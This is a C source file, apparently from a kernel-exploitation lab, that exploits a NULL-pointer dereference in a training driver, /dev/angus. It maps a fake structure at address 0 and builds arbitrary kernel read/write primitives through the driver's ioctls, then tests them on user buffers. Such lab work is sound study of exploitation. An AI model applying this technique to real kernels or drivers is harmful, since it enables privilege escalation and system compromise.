/**
 * AAR/AAW test:
 *   - SMAP is disabled
 *   - `mmap_min_addr` kernel parameter set to 0
 *
 */

#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define CMD_INIT    0x13370001
#define CMD_SETKEY  0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006

typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;

typedef struct {
  char *ptr;
  size_t len;
} request_t;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int fd;
XorCipher *nullptr = NULL;

int angus_getdata(char *data, size_t datalen) {
  request_t req = { .ptr = data, .len = datalen };
  return ioctl(fd, CMD_GETDATA, &req);
}
int angus_encrypt() {
  request_t req = { NULL };
  return ioctl(fd, CMD_ENCRYPT, &req);
}

// Reads into `dst`, `len` bytes from address pointed by `src`
void AAR(char *dst, char *src, size_t len) {
  // Point the `data` member of XorCipher at address 0, to the `src` address.
  nullptr->data = src;
  nullptr->datalen = len;
  // Read the string pointed by the `data` pointer at address Null + 8, using
  // the ioctl
  angus_getdata(dst, len);
}

// Writes to `dst` whatever content is pointed by `src` with length `len`.
void AAW(char *dst, char *src, size_t len) {
  // Since AAW is performed with xor, read the original data first
  char *tmp = (char*)malloc(len);
  if (tmp == NULL) fatal("malloc");
  AAR(tmp, dst, len);

  // Adjust so that it becomes the data you want to write by xor
  for (size_t i = 0; i < len; i++)
    tmp[i] ^= src[i];

  // Write
  nullptr->data = dst;
  nullptr->datalen = len;
  nullptr->key = tmp;
  nullptr->keylen = len;
  angus_encrypt();

  free(tmp);
}

int main() {
  fd = open("/dev/angus", O_RDWR);
  if (fd == -1) fatal("/dev/angus");

  // Allocate memory at NULL address for fake XorCipher
  if (mmap(0, 0x1000, PROT_READ|PROT_WRITE,
           MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE,
           -1, 0) != NULL)
    fatal("mmap");

  // AAR/AAW testing
  char buf[0x10];
  AAR(buf, "Hello, World!", 13);
  printf("AAR: %s\n", buf);
  AAW(buf, "This is a test", 14);
  printf("AAW: %s\n", buf);

  close(fd);
  return 0;
}
